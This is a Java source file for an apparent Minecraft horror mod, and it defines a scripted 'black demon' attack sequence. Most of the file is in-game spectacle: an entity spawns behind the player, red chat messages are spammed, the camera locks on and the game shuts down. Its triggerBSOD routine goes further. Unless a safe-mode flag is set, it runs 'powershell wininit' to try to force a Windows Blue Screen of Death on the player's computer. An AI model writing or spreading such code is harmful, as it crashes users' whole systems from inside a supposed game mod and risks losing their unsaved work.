package net.minecraft.src;

import net.minecraft.client.Minecraft;

/**
 * Manages the black demon attack sequence
 */
public class AttackSequenceManager {
    private static long messageTimer = 0;
    private static String[] messages = {
        "\u00a7cGET OUT",
        "\u00a7cLEAVE",
        "\u00a7cWHY ARE YOU HERE",
        "\u00a7cTHIS ISN'T FOR YOU",
        "\u00a7cSTOP",
        "\u00a7cGO AWAY",
        "\u00a7cYOU SHOULDN'T BE HERE",
        "\u00a7cLEAVE NOW"
    };

    /**
     * Trigger the attack sequence
     */
    public static void triggerAttack(EntityPlayer player) {
        if (HorrorState.attackSequenceActive) {
            return;
        }

        HorrorState.attackSequenceActive = true;
        HorrorState.attackStartTime = System.currentTimeMillis();

        // Spawn black demon entity 5 blocks behind player at eye level
        // (opposite direction from where player is looking)
        double angle = Math.toRadians(player.rotationYaw + 180.0); // Add 180 degrees to spawn behind
        double offsetX = -Math.sin(angle) * 5.0;
        double offsetZ = Math.cos(angle) * 5.0;

        EntityBlackDemon demon = new EntityBlackDemon(player.worldObj, player);
        demon.setPosition(
            player.posX + offsetX,
            player.posY + player.getEyeHeight(),
            player.posZ + offsetZ
        );
        player.worldObj.spawnEntityInWorld(demon);
        HorrorState.attackEntity = demon;

        // Start message spam thread
        startMessageSpam();

        // Start crash visual effects
        CrashEffectsManager.startEffects();

        // Skip violent window shake to prevent freeze (now handled by CrashEffectsManager)
        // GlitchManager.triggerViolentShake();

        // Play ambient sound
        Minecraft mc = Minecraft.theMinecraft;
        if (mc != null && mc.sndManager != null) {
            mc.sndManager.playSoundFX("portal.portal", 2.0F, 0.5F);
        }

        // Schedule crash after 10 seconds (BSOD if not safe mode, normal crash if safe mode)
        scheduleCrash();
    }

    /**
     * Schedule crash after attack sequence
     */
    private static void scheduleCrash() {
        new Thread(new Runnable() {
            public void run() {
                try {
                    // Wait 10 seconds for attack sequence
                    Thread.sleep(10000);

                    if (HorrorState.safeMode) {
                        // Safe mode: just crash the game
                        Minecraft mc = Minecraft.theMinecraft;
                        if (mc != null) {
                            mc.shutdown();
                        }
                    } else {
                        // Not safe mode: trigger BSOD
                        triggerBSOD();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    /**
     * Trigger Blue Screen of Death via PowerShell, or crash game if BSOD fails
     * Supports Windows, Android (PojavLauncher, Zalith), and other platforms
     */
    private static void triggerBSOD() {
        boolean bsodTriggered = false;

        try {
            // Detect platform
            String osName = System.getProperty("os.name").toLowerCase();
            String javaVendor = System.getProperty("java.vendor").toLowerCase();
            String javaHome = System.getProperty("java.home").toLowerCase();

            // Check if running on Android (PojavLauncher, Zalith)
            boolean isAndroid = javaVendor.contains("android") ||
                               javaHome.contains("android") ||
                               osName.contains("linux") && (javaVendor.contains("pojav") || javaVendor.contains("zalith"));

            if (!isAndroid && osName.contains("win")) {
                // Windows: Try to trigger BSOD via PowerShell
                try {
                    ProcessBuilder pb = new ProcessBuilder("powershell", "wininit");
                    Process process = pb.start();

                    // Wait up to 2 seconds to see if BSOD triggers
                    Thread.sleep(2000);

                    // If we're still here, BSOD didn't work
                    try {
                        process.destroy();
                    } catch (Exception e) {
                        // Ignore
                    }
                } catch (Exception e) {
                    System.err.println("BSOD trigger failed: " + e.getMessage());
                }
            }

            // If BSOD didn't trigger (Android, non-Windows, or BSOD failed), crash the game
            System.err.println("BSOD not available on this platform, crashing game instead");
            crashGame();

        } catch (Exception e) {
            System.err.println("Failed to trigger BSOD: " + e.getMessage());
            e.printStackTrace();

            // Fallback: crash the game
            crashGame();
        }
    }

    /**
     * Force crash the game
     */
    private static void crashGame() {
        try {
            Minecraft mc = Minecraft.theMinecraft;
            if (mc != null) {
                mc.shutdown();
            }

            // Force exit if shutdown doesn't work
            Thread.sleep(1000);
            System.exit(1);
        } catch (Exception e) {
            // Last resort: throw runtime exception
            throw new RuntimeException("Game crashed by horror mod");
        }
    }

    /**
     * Start spamming messages every 10ms
     */
    private static void startMessageSpam() {
        new Thread(new Runnable() {
            public void run() {
                try {
                    long startTime = System.currentTimeMillis();
                    while (System.currentTimeMillis() - startTime < 10000) {
                        Minecraft mc = Minecraft.theMinecraft;
                        if (mc != null && mc.thePlayer != null) {
                            String message = messages[(int)(Math.random() * messages.length)];
                            mc.thePlayer.addChatMessage(message);
                        }

                        Thread.sleep(10); // 10ms
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    /**
     * Update camera to lock onto demon
     */
    public static void updateCameraLock() {
        if (!HorrorState.attackSequenceActive || HorrorState.attackEntity == null) {
            return;
        }

        Minecraft mc = Minecraft.theMinecraft;
        if (mc == null || mc.thePlayer == null) {
            return;
        }

        // Calculate angle to demon
        double dx = HorrorState.attackEntity.posX - mc.thePlayer.posX;
        double dy = (HorrorState.attackEntity.posY + HorrorState.attackEntity.getEyeHeight()) -
                    (mc.thePlayer.posY + mc.thePlayer.getEyeHeight());
        double dz = HorrorState.attackEntity.posZ - mc.thePlayer.posZ;

        double horizontalDistance = Math.sqrt(dx * dx + dz * dz);

        // Calculate yaw and pitch
        float targetYaw = (float)(Math.atan2(dz, dx) * 180.0 / Math.PI) - 90.0F;
        float targetPitch = (float)(-(Math.atan2(dy, horizontalDistance) * 180.0 / Math.PI));

        // Lock camera
        mc.thePlayer.rotationYaw = targetYaw;
        mc.thePlayer.rotationPitch = targetPitch;
        mc.thePlayer.prevRotationYaw = targetYaw;
        mc.thePlayer.prevRotationPitch = targetPitch;
    }

    /**
     * Check if attack sequence is active
     */
    public static boolean isAttackActive() {
        return HorrorState.attackSequenceActive;
    }
}
